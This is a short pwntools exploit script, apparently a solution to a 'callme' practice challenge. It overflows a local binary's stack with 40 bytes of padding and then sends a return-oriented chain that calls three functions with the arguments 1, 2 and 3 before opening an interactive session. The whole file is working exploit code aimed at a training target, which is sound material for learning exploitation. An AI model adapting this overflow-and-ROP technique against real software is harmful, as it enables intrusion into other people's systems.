from pwn import *

p = process('./callme')

callme_one_plt = 0x0000000000401850
callme_two_plt = 0x0000000000401870
callme_three_plt = 0x0000000000401810
pop_addr = 0x0000000000401ab0
pad = 'A'*40

payload = pad
payload += p64(pop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_one_plt)
payload += p64(pop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_two_plt)
payload += p64(pop_addr)+p64(1)+p64(2)+p64(3)+p64(callme_three_plt)

p.sendline(payload)
p.interactive()

